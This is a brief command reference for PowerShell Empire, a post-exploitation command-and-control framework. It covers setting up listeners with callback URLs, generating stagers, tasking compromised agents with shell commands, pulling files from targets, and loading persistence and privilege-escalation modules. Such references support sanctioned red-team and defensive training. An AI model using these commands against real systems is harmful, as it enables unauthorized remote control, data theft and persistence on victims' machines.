# PowerShell Empire: Basic Commands Reference

## Overview

PowerShell Empire is a post-exploitation framework that provides agents for command and control, primarily using PowerShell.

## Listener Management

### View Listeners
- `listeners` – List all active listeners.

### Create Listener
- `uselistener [type]` – Select a listener module.
  - Example: `uselistener http`
- `set Name [name]` – Set listener name.
- `set Host http://[IP]:[PORT]` – Set callback URL.
- `execute` – Start the listener.

### Delete Listener
- `kill [name]` – Stop and remove a listener.

## Stagers

### View Stagers
- `usestager [type]` – Use a stager module (e.g., `windows/launcher_bat`).
- `set Listener [name]` – Link to a running listener.
- `execute` – Generate the stager payload.

## Agents

### View Active Agents
- `agents` – List all active agents.

### Interact with an Agent
- `interact [agent_name]` – Enter an agent session.

### Task Agent
Once inside an agent session:
- `shell [command]` – Run a shell command.
- `ps` – List processes.
- `pwd` – Print working directory.
- `ls` – List files.

### Upload / Download
- `upload [local]` – Upload file to the target.
- `download [remote]` – Download file from the target.

### Persistence & Priv Esc
- `usemodule persistence/...` – Use a persistence module.
- `usemodule privesc/...` – Use a privilege escalation module.
- `info` – Show info about the selected module.
- `set [option] [value]` – Set required options.
- `execute` – Run the module.

### Kill Agent
- `kill [agent_name]` – Terminate the agent session.

## Notes
- Use `help` at any prompt to list available commands.
- Modules are organized under categories like `recon`, `privesc`, `lateral_movement`, etc.
- Empire requires Python and PowerShell support on the target system.
